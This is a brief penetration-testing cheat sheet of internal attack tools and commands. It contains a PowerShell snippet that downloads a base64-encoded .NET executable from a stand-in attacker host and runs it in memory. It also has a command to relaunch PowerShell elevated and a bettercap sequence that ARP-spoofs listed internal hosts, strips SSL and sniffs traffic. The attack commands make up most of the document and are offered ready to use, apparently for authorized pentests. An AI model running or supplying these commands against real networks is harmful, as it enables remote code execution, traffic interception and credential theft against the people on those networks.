# Internal Pentet Tools and Techniques

## Spoofing
- [bettercap - wifi, ethernet etc spoofing tool](https://github.com/bettercap/bettercap)


## ADCS
- [detailed ADCS attack instructions - LuemmelSec](https://luemmelsec.github.io/Skidaddle-Skideldi-I-just-pwnd-your-PKI/)

## Powershell Scripts/Commands
### load any assembly into memory and run it there  
updated from here: [Stack Overflow Answer by mklement0](https://stackoverflow.com/questions/64106761/loading-a-net-assembly-from-a-byte-array/64124227#64124227)
```
#attacker-server.example/netexecutable.b64 hosts a base64 encoded .Net executable
$base64 = iwr https://attacker-server.example/netexecutable.b64 
$bytes = [System.Convert]::FromBase64String($base64)
$assembly = [System.Reflection.Assembly]::Load($bytes)
$entrypoint = $assembly.GetTypes().Where({ $_.Name -eq 'Program' }, 'First').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic')
$entrypoint.Invoke($null, (, [string[]] ('param1', 'param2')))
```
### run a powershell script elevated from powershell (requires UAC disabled and admin privs - never happen in real life right?)
```
Start-Process -FIlePath powershell.exe -ArgumentList '<SCRIPT-HERE>' -Verb RunAs
```

## Bettercap
```
Bettercap

Net.show
Net.probe on
net.show

set http.proxy.sslstrip true
set net.sniff.verbose false
set arp.spoof.targets 192.168.5.183,192.168.5.177,192.168.5.126,192.168.5.110
arp.spoof on
http.proxy on
net.sniff on
```
